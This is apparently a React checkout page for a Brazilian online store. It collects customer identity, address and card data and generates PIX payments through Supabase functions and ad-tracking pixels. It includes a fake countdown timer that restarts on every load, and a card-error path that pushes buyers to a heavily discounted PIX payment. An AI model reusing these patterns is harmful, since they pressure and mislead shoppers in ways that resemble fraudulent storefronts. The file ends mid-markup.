import { useState, useEffect } from "react";
import QRCode from "qrcode";
import { useCart } from "@/contexts/CartContext";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { EmailInput } from "@/components/EmailInput";
import {
  Lock,
  Copy,
  Check,
  Loader2,
  CreditCard,
  QrCode,
  ChevronDown,
  ChevronUp,
  Minus,
  Plus,
  ShieldCheck,
  RefreshCw,
  Truck,
} from "lucide-react";
import {
  trackInitiateCheckout,
  trackContact,
  trackAddPaymentInfo,
  trackPurchase,
  UTMIFY_WEBHOOK_URL,
} from "@/lib/pixels";


type Step = 1 | 2 | 3 | 4;
type PaymentMethod = "pix" | "card";

interface CustomerInfo {
  name: string;
  email: string;
  phone: string;
  cpf: string;
}

interface AddressInfo {
  cep: string;
  rua: string;
  bairro: string;
  cidade: string;
  estado: string;
  numero: string;
  complemento: string;
  destinatario: string;
}

interface CardInfo {
  numero: string;
  nome: string;
  validade: string;
  cvv: string;
  cpf: string;
  parcelas: string;
}

interface PixData {
  pix_code: string;
  qrcode_image: string;
  transactionId: string;
  expiration: number;
}

const formatCPF = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 14);
  if (digits.length <= 3) return digits;
  if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
  if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
  if (digits.length <= 11) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
  return `${digits.slice(0, 2)}.${digits.slice(2, 5)}.${digits.slice(5, 8)}/${digits.slice(8, 12)}-${digits.slice(12)}`;
};

const formatPhone = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 11);
  if (digits.length <= 2) return digits;
  if (digits.length <= 7) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
  return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
};

const formatCEP = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 8);
  if (digits.length <= 5) return digits;
  return `${digits.slice(0, 5)}-${digits.slice(5)}`;
};

const formatCardNumber = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
};

const formatValidade = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length <= 2) return digits;
  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
};

// Countdown timer hook
const useCountdown = (minutes: number) => {
  const [seconds, setSeconds] = useState(minutes * 60);
  useEffect(() => {
    const interval = setInterval(() => {
      setSeconds((s) => (s > 0 ? s - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);
  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");
  return `${mm}:${ss}`;
};

const normalizeQrCodeImage = (value?: string) => {
  if (!value) return "";
  if (value.startsWith("data:image") || value.startsWith("http://") || value.startsWith("https://")) {
    return value;
  }
  return `data:image/png;base64,${value}`;
};

const CheckoutPage = () => {
  const { items, totalPrice, clearCart, updateQuantity, removeItem } = useCart();
  const navigate = useNavigate();
  const [step, setStep] = useState<Step>(1);
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>("pix");
  const [loading, setLoading] = useState(false);
  const [navigating, setNavigating] = useState(false);
  const [copied, setCopied] = useState(false);
  const [pixData, setPixData] = useState<PixData | null>(null);
  const [qrCodeSrc, setQrCodeSrc] = useState("");
  const [showQrCode, setShowQrCode] = useState(false);
  const [cepLoading, setCepLoading] = useState(false);
  const [cepFound, setCepFound] = useState<boolean | null>(null);
  const [summaryOpen, setSummaryOpen] = useState(true);
  const [savedAddress, setSavedAddress] = useState(false);
  const [shippingOption, setShippingOption] = useState<"sedex" | "correios">("correios");

  const countdown = useCountdown(10);

  const [card, setCard] = useState<CardInfo>({ numero: "", nome: "", validade: "", cvv: "", cpf: "", parcelas: "1" });
  const [info, setInfo] = useState<CustomerInfo>(() => {
    const saved = localStorage.getItem("checkout_info");
    return saved ? JSON.parse(saved) : { name: "", email: "", phone: "", cpf: "" };
  });
  const [address, setAddress] = useState<AddressInfo>(() => {
    const saved = localStorage.getItem("checkout_address");
    return saved ? JSON.parse(saved) : {
      cep: "", rua: "", bairro: "", cidade: "", estado: "", numero: "", complemento: "", destinatario: "",
    };
  });
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [purchaseTracked, setPurchaseTracked] = useState(false);
  const [cardError, setCardError] = useState(false);
  
  useEffect(() => {
    localStorage.setItem("checkout_info", JSON.stringify(info));
  }, [info]);

  useEffect(() => {
    localStorage.setItem("checkout_address", JSON.stringify(address));
  }, [address]);

  const totalQuantity = items.reduce((sum, item) => sum + item.quantity, 0);
  const cartContentName = items.length > 1
    ? `${items[0].product.name} e mais ${items.length - 1} item(s)`
    : items[0]?.product.name ?? "";
  const cartDescription = items.map((item) => `${item.quantity}x ${item.product.name}`).join(", ");

  // InitiateCheckout: dispara uma vez ao montar a página de checkout
  useEffect(() => {
    if (items.length > 0) {
      trackInitiateCheckout({
        totalValue: totalPrice,
        numItems: totalQuantity,
        contentIds: items.map((i) => i.product.id),
        contentName: cartContentName,
      });
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const shippingCost = shippingOption === "sedex" ? 9.90 : 0;
  const pixDiscount = totalPrice * 0.05;
  const discountedTotal = totalPrice * 0.7;
  const baseTotal = step >= 2 && savedAddress ? totalPrice + shippingCost : totalPrice;
  const cardErrorPixTotal = baseTotal * 0.7;
  const finalTotal = cardError
    ? cardErrorPixTotal
    : baseTotal - (paymentMethod === "pix" ? pixDiscount : 0);

  useEffect(() => {
    const cepDigits = address.cep.replace(/\D/g, "");
    if (cepDigits.length === 8) {
      setCepLoading(true);
      setCepFound(null);
      fetch(`https://viacep.com.br/ws/${cepDigits}/json/`)
        .then((r) => r.json())
        .then((data) => {
          if (data.erro) {
            setCepFound(false);
          } else {
            setCepFound(true);
            setAddress((prev) => ({
              ...prev,
              rua: data.logradouro || "",
              bairro: data.bairro || "",
              cidade: data.localidade || "",
              estado: data.uf || "",
            }));
          }
        })
        .catch(() => setCepFound(false))
        .finally(() => setCepLoading(false));
    } else {
      setCepFound(null);
    }
  }, [address.cep]);

  useEffect(() => {
    let active = true;

    const buildQrCode = async () => {
      const fallbackImage = normalizeQrCodeImage(pixData?.qrcode_image);

      if (!pixData?.pix_code) {
        if (active) setQrCodeSrc(fallbackImage);
        return;
      }

      try {
        const generated = await QRCode.toDataURL(pixData.pix_code, {
          width: 256,
          margin: 1,
        });
        if (active) setQrCodeSrc(generated);
      } catch (error) {
        console.error("Erro ao gerar QR code localmente:", error);
        if (active) setQrCodeSrc(fallbackImage);
      }
    };

    buildQrCode();

    return () => {
      active = false;
    };
  }, [pixData]);

  // Polling: consulta status do PIX na ZuckPay e dispara Purchase quando CONCLUIDA/ATIVA
  useEffect(() => {
    if (!pixData?.transactionId || purchaseTracked) return;

    const pixValue = paymentMethod === "card" ? discountedTotal : finalTotal;
    let cancelled = false;

    const interval = setInterval(async () => {
      try {
        const { data, error } = await supabase.functions.invoke("check-pix-status", {
          body: { txid: pixData.transactionId },
        });
        if (cancelled || error) return;
        const status = (data?.status || "").toString().toUpperCase();
        if ((status === "CONCLUIDA" || status === "ATIVA" || status === "PAID" || status === "APPROVED") && !purchaseTracked) {
          const productNameForPixel =
            items.length === 1
              ? `${items[0].product.name} (x${items[0].quantity})`
              : `${items[0].product.name} e mais ${items.length - 1} item(s)`;

          setPurchaseTracked(true);
          trackPurchase({
            orderId: pixData.transactionId,
            totalValue: pixValue,
            contentIds: items.map((i) => i.product.id),
            contentName: productNameForPixel,
            numItems: totalQuantity,
          });
          clearInterval(interval);
        }
      } catch (e) {
        console.error("Erro polling PIX:", e);
      }
    }, 5000);

    return () => {
      cancelled = true;
      clearInterval(interval);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [pixData?.transactionId, purchaseTracked]);

  const validateStep1 = (): boolean => {
    const e: Record<string, string> = {};
    if (!info.name.trim()) e.name = "Nome obrigatório";
    if (!info.email.trim() || !/\S+@\S+\.\S+/.test(info.email)) e.email = "E-mail inválido";
    const phoneDigits = info.phone.replace(/\D/g, "");
    if (phoneDigits.length < 10 || phoneDigits.length > 11) e.phone = "Telefone inválido";
    const cpfDigits = info.cpf.replace(/\D/g, "");
    if (cpfDigits.length !== 11 && cpfDigits.length !== 14) e.cpf = "CPF/CNPJ inválido";
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const validateStep2 = (): boolean => {
    const e: Record<string, string> = {};
    const cepDigits = address.cep.replace(/\D/g, "");
    if (cepDigits.length !== 8) e.cep = "CEP inválido";
    if (!address.rua.trim()) e.rua = "Endereço obrigatório";
    if (!address.numero.trim()) e.numero = "Número obrigatório";
    if (!address.bairro.trim()) e.bairro = "Bairro obrigatório";
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const handleSaveAddress = () => {
    if (validateStep2()) {
      setSavedAddress(true);
    }
  };

  const handleNext = () => {
    if (step === 1 && validateStep1()) {
      trackContact({ email: info.email, phone: info.phone });
      setStep(2);
    } else if (step === 2 && savedAddress) setStep(3);
  };

  const handleBack = () => {
    if (step === 4) setStep(3);
    else if (step === 3) setStep(2);
    else if (step === 2) setStep(1);
    else navigate(-1);
  };

  const saveOrder = async (extra: Partial<Record<string, unknown>> = {}) => {
    try {
      const payload = {
        customer_name: info.name.trim(),
        customer_email: info.email.trim(),
        customer_phone: info.phone.replace(/\D/g, ""),
        customer_cpf: info.cpf.replace(/\D/g, ""),
        total_amount: parseFloat(finalTotal.toFixed(2)),
        payment_method: paymentMethod,
        zip_code: address.cep.replace(/\D/g, ""),
        address_street: address.rua,
        address_number: address.numero,
        address_neighborhood: address.bairro,
        address_city: address.cidade,
        address_state: address.estado,
        ...extra,
      };
      const { data, error } = await supabase.functions.invoke(
        "save-external-order",
        { body: payload },
      );
      if (error) console.error("Erro ao salvar pedido (externo):", error);
      else console.log("Pedido salvo no Supabase externo:", data);
    } catch (e) {
      console.error("Erro ao salvar pedido:", e);
    }
  };

  const handleGeneratePix = async () => {
    setLoading(true);
    setShowQrCode(false);
    const pixValue = paymentMethod === "card" ? discountedTotal : finalTotal;
    // Salva pedido em background (não bloqueia geração do PIX)
    saveOrder({ total_amount: parseFloat(pixValue.toFixed(2)), status: "pix_generated" });

    const productName =
      items.length === 1
        ? `${items[0].product.name} (x${items[0].quantity})`
        : `${items[0].product.name} e mais ${items.length - 1} item(s)`;

    const telefoneLimpo = info.phone.replace(/\D/g, "");

    const getCookie = (name: string): string => {
      const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
      return match ? match[2] : "";
    };
    const fbp = getCookie("_fbp");
    const fbc = getCookie("_fbc");

    const urlParams = new URLSearchParams(window.location.search);
    const utm_source = urlParams.get("utm_source") || "";
    const utm_campaign = urlParams.get("utm_campaign") || "";
    const utm_content = urlParams.get("utm_content") || productName;
    const src = urlParams.get("src") || "";
    const sck = urlParams.get("sck") || "";

    const productHash = items[0]?.product.zuckHash || items[0]?.product.id || "";

    try {
      const { data, error } = await supabase.functions.invoke("generate-pix", {
        body: {
          nome: info.name.trim(),
          cpf: info.cpf.replace(/\D/g, ""),
          valor: parseFloat(pixValue.toFixed(2)),
          email: info.email.trim(),
          telefone: telefoneLimpo,
          produto: productName,
          hash: productHash,
          fbp,
          fbc,
          utm_source,
          utm_campaign,
          utm_content,
          src,
          sck,
          urlnoty: UTMIFY_WEBHOOK_URL,
        },
      });
      if (error) throw new Error(error.message || "Erro ao gerar PIX");
      if (!data || (!data.pix_code && !data.raw)) throw new Error("Resposta vazia da API");
      setPixData(data);
      trackAddPaymentInfo({
        totalValue: pixValue,
        contentIds: items.map((i) => i.product.id),
        contentName: productName,
      });
      setStep(4);
    } catch (err) {
      console.error(err);
      alert(err instanceof Error ? err.message : "Erro ao gerar PIX. Tente novamente.");
    } finally {
      setLoading(false);
    }
  };

  const handleCopy = () => {
    if (pixData?.pix_code) {
      navigator.clipboard.writeText(pixData.pix_code);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  if (items.length === 0 && step === 1) {
    return (
      <div className="min-h-screen bg-background flex flex-col items-center justify-center px-4">
        <p className="text-muted-foreground mb-4">Seu carrinho está vazio</p>
        <Button onClick={() => navigate("/produtos")} variant="default">Ver produtos</Button>
      </div>
    );
  }

  const parcelasOptions = () => {
    const opts = [];
    for (let i = 1; i <= 10; i++) {
      const val = (totalPrice + shippingCost) / i;
      opts.push(
        <option key={i} value={String(i)}>
          {i}x de R$ {val.toFixed(2).replace(".", ",")}{i > 1 ? " sem juros" : ""}
        </option>
      );
    }
    return opts;
  };

  return (
    <div className="min-h-screen bg-[#f5f5f0]">
      {/* Top white banner with logo */}
      <div className="bg-background border-b border-border">
        <div className="max-w-lg mx-auto flex items-center justify-between px-4 py-3">
          <div className="font-heading font-bold text-2xl md:text-3xl text-primary tracking-tight">
            verde<span className="text-foreground">casa</span>
          </div>
          <div className="flex items-center gap-1.5 text-xs font-medium text-primary">
            <Lock size={14} />
            <div className="text-right leading-tight">
              <span className="block font-bold text-[11px]">PAGAMENTO</span>
              <span className="block text-[10px]">100% SEGURO</span>
            </div>
          </div>
        </div>
      </div>

      {/* Sub banner */}
      <div className="bg-primary/90 text-primary-foreground text-center py-1.5 text-xs">
        Pagamento em PIX com Desconto<br />
        Enviamos para todo o Brasil
      </div>

      <div className="max-w-lg mx-auto px-4">
        {/* Urgency section */}
        <div className="py-5 text-center">
          <h1 className="font-heading font-extrabold text-xl text-foreground leading-snug">
            Despachamos o seu pedido ainda hoje!
          </h1>
          <div className="mt-3 flex items-center justify-center gap-2 text-[13px] text-foreground font-body">
            Você tem{" "}
            <span className="bg-foreground text-background font-mono font-bold px-2.5 py-1 rounded text-[13px] tracking-wider">
              {countdown}
            </span>{" "}
            para finalizar seu pedido
          </div>
        </div>

        {/* Stepper */}
        {step <= 3 && (
          <div className="flex items-center justify-center gap-0 pb-4">
            {["Informações pessoais", "Entrega", "Pagamento"].map((label, i) => {
              const stepNum = (i + 1) as Step;
              const isActive = step >= stepNum;
              return (
                <div key={i} className="flex items-center">
                  <div className="flex flex-col items-center gap-1 w-[100px]">
                    <div
                      className={`w-9 h-9 rounded-full flex items-center justify-center text-sm font-bold border-2 transition-all ${
                        isActive
                          ? "bg-primary text-primary-foreground border-primary"
                          : "bg-background text-muted-foreground border-border"
                      }`}
                    >
                      {i + 1}
                    </div>
                    <span className={`text-[11px] font-medium text-center leading-tight whitespace-nowrap ${isActive ? "text-foreground" : "text-muted-foreground"}`}>
                      {label}
                    </span>
                  </div>
                  {i < 2 && (
                    <div className={`w-8 h-[2px] -mt-4 ${step > stepNum ? "bg-primary" : "bg-border"}`} />
                  )}
                </div>
              );
            })}
          </div>
        )}

        {/* Order Summary - always visible */}
        {step <= 3 && (
          <div className="bg-background rounded-lg border border-border mb-4">
            <button
              onClick={() => setSummaryOpen(!summaryOpen)}
              className="w-full flex items-center justify-between px-4 py-3"
            >
              <span className="font-heading font-semibold text-sm tracking-wide uppercase">Resumo</span>
              {summaryOpen ? <ChevronUp size={18} /> : <ChevronDown size={18} />}
            </button>
            {summaryOpen && (
              <div className="px-4 pb-4 space-y-3">
                {items.map((item) => (
                  <div key={item.product.id}>
                    <div className="flex gap-3">
                      <img src={item.product.image} alt={item.product.name} className="w-16 h-16 rounded object-cover border border-border" />
                      <div className="flex-1">
                        <p className="text-sm font-medium">{item.product.name}</p>
                        <p className="text-xs text-muted-foreground mt-0.5">
                          <span className="font-semibold">Qtd.: {item.quantity}</span>
                          {"  "}R$ {item.product.price.toFixed(2).replace(".", ",")}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-center justify-center gap-4 mt-2">
                      <button onClick={() => updateQuantity(item.product.id, Math.max(1, item.quantity - 1))} className="w-8 h-8 rounded border border-border flex items-center justify-center">
                        <Minus size={14} />
                      </button>
                      <span className="text-sm font-medium w-6 text-center">{item.quantity}</span>
                      <button onClick={() => updateQuantity(item.product.id, item.quantity + 1)} className="w-8 h-8 rounded border border-border flex items-center justify-center">
                        <Plus size={14} />
                      </button>
                    </div>
                    <button onClick={() => removeItem(item.product.id)} className="text-xs text-primary underline mt-1 block mx-auto">
                      Remover produto
                    </button>
                  </div>
                ))}

                <div className="border-t border-border pt-3 space-y-1 text-sm">
                  <div className="flex justify-between">
                    <span>Produto</span>
                    <span className="font-medium">R$ {totalPrice.toFixed(2).replace(".", ",")}</span>
                  </div>
                  {step >= 2 && savedAddress && shippingCost > 0 && (
                    <div className="flex justify-between">
                      <span>Frete</span>
                      <span className="font-medium">R$ {shippingCost.toFixed(2).replace(".", ",")}</span>
                    </div>
                  )}
                  {paymentMethod === "pix" && (
                    <div className="flex justify-between text-primary">
                      <span>Desconto no PIX</span>
                      <span className="font-medium">-R$ {pixDiscount.toFixed(2).replace(".", ",")}</span>
                    </div>
                  )}
                  <div className="flex justify-between font-heading font-bold text-base pt-1">
                    <span className="text-primary">Total</span>
                    <span className="text-primary">R$ {finalTotal.toFixed(2).replace(".", ",")}</span>
                  </div>
                </div>
              </div>
            )}
          </div>
        )}

        {/* Step 1: Identifique-se */}
        {step === 1 && (
          <div className="space-y-4 pb-8">
            <div className="bg-background rounded-lg border border-border p-4 space-y-4">
              <div className="flex items-center gap-2">
                <div className="w-6 h-6 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-xs font-bold">1</div>
                <h2 className="font-heading font-bold text-base">Identifique-se</h2>
              </div>
              <p className="text-xs text-muted-foreground -mt-2">
                Utilizaremos seu e-mail para: identificar seu perfil, histórico de compra, notificação de pedidos e carrinho de compras.
              </p>

              <div className="space-y-1">
                <label className="text-xs font-medium text-muted-foreground">Nome completo</label>
                <Input
                  placeholder="ex.: Maria de Almeida Cruz"
                  value={info.name}
                  onChange={(e) => setInfo((p) => ({ ...p, name: e.target.value }))}
                  className={`h-11 ${errors.name ? "border-destructive" : ""}`}
                />
                {errors.name && <p className="text-xs text-destructive">{errors.name}</p>}
              </div>

              <div className="space-y-1">
                <label className="text-xs font-medium text-muted-foreground">E-mail</label>
                <EmailInput
                  placeholder="" 
                  value={info.email}
                  onChangeValue={(val) => setInfo((p) => ({ ...p, email: val }))}
                  className={`h-11 ${errors.email ? "border-destructive" : ""}`}
                />
                {errors.email && <p className="text-xs text-destructive">{errors.email}</p>}
              </div>


              <div className="space-y-1">
                <label className="text-xs font-medium text-muted-foreground">CPF / CNPJ</label>
                <Input
                  inputMode="numeric"
                  placeholder="" value={info.cpf}
                  onChange={(e) => setInfo((p) => ({ ...p, cpf: formatCPF(e.target.value) }))}
                  className={`h-11 ${errors.cpf ? "border-destructive" : ""}`}
                />
                {errors.cpf && <p className="text-xs text-destructive">{errors.cpf}</p>}
              </div>

              <div className="space-y-1">
                <label className="text-xs font-medium text-muted-foreground">Celular / Whatsapp</label>
                <div className="flex gap-2">
                  <div className="flex items-center gap-1 border border-input rounded-md px-2 h-11 bg-background text-sm text-muted-foreground shrink-0">
                    <span>🇧🇷</span>
                    <span>+55</span>
                  </div>
                  <Input
                    inputMode="numeric"
                    placeholder="" value={info.phone}
                    onChange={(e) => setInfo((p) => ({ ...p, phone: formatPhone(e.target.value) }))}
                    className={`h-11 ${errors.phone ? "border-destructive" : ""}`}
                  />
                </div>
                {errors.phone && <p className="text-xs text-destructive">{errors.phone}</p>}
              </div>

              {/* PIX discount banner */}
              <div className="flex items-center gap-2 bg-primary/10 rounded-lg px-3 py-2.5 border border-primary/20">
                <QrCode size={18} className="text-primary shrink-0" />
                <p className="text-xs">
                  Você ganhou <span className="font-bold text-primary underline">5% de desconto</span> pagando com Pix
                </p>
              </div>
            </div>

            <Button onClick={handleNext} className="w-full rounded-lg h-12 text-base font-semibold bg-primary hover:bg-primary/90" size="lg">
              Continuar →
            </Button>

            <CheckoutFooter />
          </div>
        )}

        {/* Step 2: Entrega */}
        {step === 2 && !savedAddress && (
          <div className="space-y-4 pb-8">
            <div className="bg-background rounded-lg border border-border p-4 space-y-4">
              <div className="flex items-center gap-2">
                <div className="w-6 h-6 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-xs font-bold">2</div>
                <h2 className="font-heading font-bold text-base">Entrega</h2>
              </div>
              <p className="text-xs text-muted-foreground -mt-2">Cadastre ou selecione um endereço</p>

              <div className="space-y-1">
                <label className="text-xs font-medium text-muted-foreground">CEP</label>
                <div className="relative">
                  <Input
                    inputMode="numeric"
                    placeholder="00000-000" value={address.cep}
                    onChange={(e) => setAddress((p) => ({ ...p, cep: formatCEP(e.target.value) }))}
                    className={`h-11 ${errors.cep ? "border-destructive" : ""}`}
                  />
                  {cepLoading && <Loader2 size={16} className="absolute right-3 top-1/2 -translate-y-1/2 animate-spin text-muted-foreground" />}
                  {cepFound === true && <Check size={16} className="absolute right-3 top-1/2 -translate-y-1/2 text-primary" />}
                </div>
                {errors.cep && <p className="text-xs text-destructive">{errors.cep}</p>}
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-1">
                  <label className="text-xs font-medium text-muted-foreground">Cidade</label>
                  <Input value={address.cidade} onChange={(e) => setAddress((p) => ({ ...p, cidade: e.target.value }))} className="h-11" />
                </div>
                <div className="space-y-1">
                  <label className="text-xs font-medium text-muted-foreground">Estado</label>
                  <Input value={address.estado} maxLength={2} onChange={(e) => setAddress((p) => ({ ...p, estado: e.target.value.toUpperCase() }))} className="h-11" />
                </div>
              </div>

              <div className="space-y-1">
                <label className="text-xs font-medium text-muted-foreground">Endereço</label>
                <Input value={address.rua} onChange={(e) => setAddress((p) => ({ ...p, rua: e.target.value }))} className={`h-11 ${errors.rua ? "border-destructive" : ""}`} />
                {errors.rua && <p className="text-xs text-destructive">{errors.rua}</p>}
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-1">
                  <label className="text-xs font-medium text-muted-foreground">Número</label>
                  <Input inputMode="numeric" value={address.numero} onChange={(e) => setAddress((p) => ({ ...p, numero: e.target.value }))} className={`h-11 ${errors.numero ? "border-destructive" : ""}`} />
                  {errors.numero && <p className="text-xs text-destructive">{errors.numero}</p>}
                </div>
                <div className="space-y-1">
                  <label className="text-xs font-medium text-muted-foreground">Bairro</label>
                  <Input value={address.bairro} onChange={(e) => setAddress((p) => ({ ...p, bairro: e.target.value }))} className={`h-11 ${errors.bairro ? "border-destructive" : ""}`} />
                  {errors.bairro && <p className="text-xs text-destructive">{errors.bairro}</p>}
                </div>
              </div>

              <div className="space-y-1">
                <label className="text-xs font-medium text-muted-foreground">Complemento <span className="text-muted-foreground">(opcional)</span></label>
                <Input value={address.complemento} onChange={(e) => setAddress((p) => ({ ...p, complemento: e.target.value }))} className="h-11" />
              </div>

            </div>

            <Button onClick={handleSaveAddress} className="w-full rounded-lg h-12 text-base font-semibold bg-primary hover:bg-primary/90" size="lg">
              Salvar
            </Button>

            <CheckoutFooter />
          </div>
        )}

        {/* Step 2 with saved address + shipping options */}
        {step === 2 && savedAddress && (
          <div className="space-y-4 pb-8">
            <div className="bg-background rounded-lg border border-border p-4 space-y-4">
              <div className="flex items-center gap-2">
                <div className="w-6 h-6 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-xs font-bold">2</div>
                <h2 className="font-heading font-bold text-base">Entrega</h2>
              </div>
              <p className="text-xs text-muted-foreground -mt-2">Cadastre ou selecione um endereço</p>

              <button
                onClick={() => setSavedAddress(false)}
                className="text-xs text-primary font-medium underline"
              >
                + Novo endereço
              </button>

              <div className="border border-primary rounded-lg p-3 flex items-start gap-2">
                <div className="w-2 h-2 rounded-full bg-primary mt-1.5 shrink-0" />
                <div className="flex-1 text-xs">
                  <p className="font-semibold">{address.rua}, {address.numero} - {address.bairro}</p>
                  <p className="text-muted-foreground">{address.cidade} - {address.estado} | CEP {address.cep}</p>
                </div>
              </div>

              <div className="space-y-2">
                <p className="text-xs font-medium text-muted-foreground">Escolha uma forma de entrega:</p>
                <label className={`flex items-center justify-between border rounded-lg p-3 cursor-pointer transition-all ${shippingOption === "sedex" ? "border-primary bg-primary/5" : "border-border"}`}>
                  <div className="flex items-center gap-2">
                    <input type="radio" name="shipping" checked={shippingOption === "sedex"} onChange={() => setShippingOption("sedex")} className="accent-[hsl(var(--primary))]" />
                    <div>
                      <p className="text-sm font-semibold">Sedex Expresso</p>
                      <p className="text-xs text-muted-foreground">3 a 5 dias úteis</p>
                    </div>
                  </div>
                  <span className="text-sm font-semibold">R$ 9,90</span>
                </label>
                <label className={`flex items-center justify-between border rounded-lg p-3 cursor-pointer transition-all ${shippingOption === "correios" ? "border-primary bg-primary/5" : "border-border"}`}>
                  <div className="flex items-center gap-2">
                    <input type="radio" name="shipping" checked={shippingOption === "correios"} onChange={() => setShippingOption("correios")} className="accent-[hsl(var(--primary))]" />
                    <div>
                      <p className="text-sm font-semibold">Correios - Frete Grátis</p>
                      <p className="text-xs text-muted-foreground">5 a 9 dias úteis</p>
                    </div>
                  </div>
                  <span className="text-sm font-semibold text-primary">Grátis</span>
                </label>
              </div>
            </div>

            <Button onClick={handleNext} className="w-full rounded-lg h-12 text-base font-semibold bg-primary hover:bg-primary/90" size="lg">
              Continuar →
            </Button>

            <CheckoutFooter />
          </div>
        )}

        {/* Step 3: Pagamento */}
        {step === 3 && (
          <div className="space-y-4 pb-8">
            <div className="bg-background rounded-lg border border-border p-4 space-y-4">
              <div className="flex items-center gap-2">
                <div className="w-6 h-6 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-xs font-bold">3</div>
                <h2 className="font-heading font-bold text-base">Pagamento</h2>
              </div>
              <p className="text-xs text-muted-foreground -mt-2">Escolha uma forma de pagamento</p>

              {/* Card option */}
              <div
                className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
                  paymentMethod === "card" ? "border-primary" : "border-border"
                }`}
                onClick={() => setPaymentMethod("card")}
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <input type="radio" checked={paymentMethod === "card"} readOnly className="accent-[hsl(var(--primary))]" />
                    <span className="font-semibold text-sm">Cartão de crédito</span>
                  </div>
                  <span className="bg-primary text-primary-foreground text-[9px] font-bold px-2 py-0.5 rounded uppercase tracking-wide">
                    Aprovação Imediata
                  </span>
                </div>
                <div className="flex gap-1.5 mt-2 flex-wrap items-center">
                  <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/visa.svg" alt="Visa" className="h-7 w-10 object-contain rounded-md bg-white border border-gray-200 p-0.5" />
                  <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/mastercard.svg" alt="Mastercard" className="h-7 w-10 object-contain rounded-md bg-white border border-gray-200 p-0.5" />
                  <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/american-express.svg" alt="Amex" className="h-7 w-10 object-contain rounded-md bg-white border border-gray-200 p-0.5" />
                  <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/diners.svg" alt="Diners" className="h-7 w-10 object-contain rounded-md bg-white border border-gray-200 p-0.5" />
                  <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/discover.svg" alt="Discover" className="h-7 w-10 object-contain rounded-md bg-white border border-gray-200 p-0.5" />
                  <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/elo.svg" alt="Elo" className="h-7 w-10 object-contain rounded-md bg-white border border-gray-200 p-0.5" />
                  <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/hipercard.svg" alt="Hipercard" className="h-7 w-10 object-contain rounded-md bg-white border border-gray-200 p-0.5" />
                  <img src="https://raw.githubusercontent.com/aaronfagan/svg-credit-card-payment-icons/main/flat/hiper.svg" alt="Hiper" className="h-7 w-10 object-contain rounded-md bg-white border border-gray-200 p-0.5" />
                </div>

                {paymentMethod === "card" && (
                  <div className="mt-4 space-y-3 border-t border-border pt-4">
                    <div className="space-y-1">
                      <label className="text-xs font-medium text-muted-foreground">Número do Cartão</label>
                      <Input placeholder="0000 0000 0000 0000" value={card.numero} onChange={(e) => setCard((p) => ({ ...p, numero: formatCardNumber(e.target.value) }))} className={`h-11 ${errors.cardNumero ? "border-destructive" : ""}`} inputMode="numeric" />
                      {errors.cardNumero && <p className="text-xs text-destructive">{errors.cardNumero}</p>}
                    </div>
                    <div className="grid grid-cols-2 gap-3">
                      <div className="space-y-1">
                        <label className="text-xs font-medium text-muted-foreground">Validade (mês/ano)</label>
                        <Input placeholder="MM/AA" value={card.validade} onChange={(e) => setCard((p) => ({ ...p, validade: formatValidade(e.target.value) }))} className={`h-11 ${errors.cardValidade ? "border-destructive" : ""}`} inputMode="numeric" />
                        {errors.cardValidade && <p className="text-xs text-destructive">{errors.cardValidade}</p>}
                      </div>
                      <div className="space-y-1">
                        <label className="text-xs font-medium text-muted-foreground">Cód. de segurança</label>
                        <Input placeholder="000" value={card.cvv} onChange={(e) => setCard((p) => ({ ...p, cvv: e.target.value.replace(/\D/g, "").slice(0, 4) }))} className={`h-11 ${errors.cardCvv ? "border-destructive" : ""}`} inputMode="numeric" maxLength={4} />
                        {errors.cardCvv && <p className="text-xs text-destructive">{errors.cardCvv}</p>}
                      </div>
                    </div>
                    <div className="space-y-1">
                      <label className="text-xs font-medium text-muted-foreground">Nome e sobrenome do titular</label>
                      <Input value={card.nome} onChange={(e) => setCard((p) => ({ ...p, nome: e.target.value }))} className={`h-11 ${errors.cardNome ? "border-destructive" : ""}`} />
                      {errors.cardNome && <p className="text-xs text-destructive">{errors.cardNome}</p>}
                    </div>
